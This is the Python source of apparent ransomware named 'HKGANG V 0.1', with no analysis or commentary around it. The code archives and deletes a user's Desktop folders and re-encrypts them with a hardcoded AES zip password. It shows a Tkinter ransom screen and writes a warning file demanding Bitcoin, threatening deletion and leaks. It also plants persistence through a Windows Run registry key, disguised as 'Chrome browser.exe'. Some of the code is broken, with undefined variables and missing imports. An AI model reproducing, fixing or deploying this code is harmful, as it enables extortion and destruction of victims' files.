import zipfile
import os
import pyzipper
import shutil
from tkinter import *
from PIL import ImageTk,Image
import datetime
import smtplib
from email.message import EmailMessage

root = Tk()
root.title("HKGANG V 0.1")
root.resizable(0, 0)
root.geometry("800x400")
head = Label(root, text="your files have been hacked and encrypted! read the steps to get your files back\nHacked By HK-GANG " , font=("Arial",15), bg="black", fg="white")
head.grid(row=0, column=1, padx=10, pady=10)
price = Label(root, text=" HK-GANG General Decrypting Price Is 500 dollar\nbut we can do promo for you\nat least 400 dollar for all files" , font=("Arial",15), bg="black", fg="white")
price.grid(row=2, column=1, padx=10, pady=10)
helpe = Label(root, text="don't scare just pay! the link bellow\nif you did not pay over 10 days all your files will posted\nfor now we accept just Bitcoin Cryptocurrency!", font=("Arial",15), bg="black", fg="white")
helpe.grid(row=3, column=1, padx=10, pady=10)
letter_text = StringVar()
letter_text.set("SkmndklsvnKMKM6765NJ&^&5rNKkjnKN")
letter_input = Entry(root, width=40, font=("Arial", 15), textvariable=letter_text, bg="white", fg="red")
letter_input.grid(row=4, column=1, padx=1, pady=1)

class Programm:


	def become_presisent(self):
		if not os.path.exists(back_location):
			back_location = os.environ["appdata"] + "\\Chrome browser.exe"
			shutil.copyfile(sys.executable, back_location)
			subprocess.call('reg add \HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + back_location + '"', shell=True)

	def encrypt(self, path):
		os.chdir(path)
		filelist = os.listdir()
		#print(filelist)
		path_ziped = f'{path}/encrepted.zip'
		with zipfile.ZipFile(path_ziped, 'w') as myzip:
			for file in filelist:
				if os.path.isdir(path+"/"+file):
					self.encryptDir(file)
				else:
					myzip.write(f"{file}")
					os.remove(file)


	def encryptDir(self, path2):
		folder_ziped = f'{path2} encrypted.zip'
		shutil.make_archive(folder_ziped, 'zip', path2)
		shutil.rmtree(path2, ignore_errors=True)


	def colse(self, path):
		self.secret_password = b'losth7'
		os.chdir(path)
		directorys = os.listdir()
		newFiles = []
		for i in range(len(directorys)):
			nfile = f"{directorys[i][:-4]}.zip"
			newFiles.append(nfile)

		for j in range(len(directorys)):
			with open(directorys[j], 'rb') as content:
				rd = bytearray(content.read())

			with pyzipper.AESZipFile(newFiles[j],
	                		         'w',
	                        		 compression=pyzipper.ZIP_LZMA,
	                        		 encryption=pyzipper.WZ_AES) as zf:
				zf.setpassword(self.secret_password)
				zf.writestr(directorys[j], rd)

	def noice(self):
		warms = []
		for i in range(1):
			warms.append(f"warning.txt")
			with open(warms[i], 'w') as warm:
				warm.write('''
	###########@ your files has been hacked by HK-GANG groupe @###########
		1.don't scare
		2.pay 500 dollar by Bitcoine to [SkmndklsvnKMKM6765NJ&^&5rNKkjnKN]
		3.we will send the passwords to your email
		4.what will happen if you fuck with us? : 
			==> the price will increment
			==> all your files images videos will deleted !!!!!!!!!!!!!!!


					''')
				warm.close()
		os.system(f"start {warms[0]}")
		warms.append(f"warning.txt")

	def main(self, path):
		self.encrypt(path)
		#hunter(main_path)
		self.colse(path)

	def targets(self):
		target_pc = ""
		target = []
		os.chdir(f"C:/Users/{target_pc}/Desktop/")
		dirs = os.listdir()
		for f in dirs:
			if os.path.isdir(f):
				target.append(f)
		return target

my_app = Programm()
targets_dirs = my_app.targets()
try:
	desktoppath = f"C:/Users/{target_pc}/Desktop/"
	for d in targets_dirs:
		targetpath = desktoppath +d
		if "encrypted.zip" not in os.listdir(targetpath):
			my_app.main(targetpath)
		else:
			continue
	my_app.noice()
except Exception:
	pass


root.mainloop()
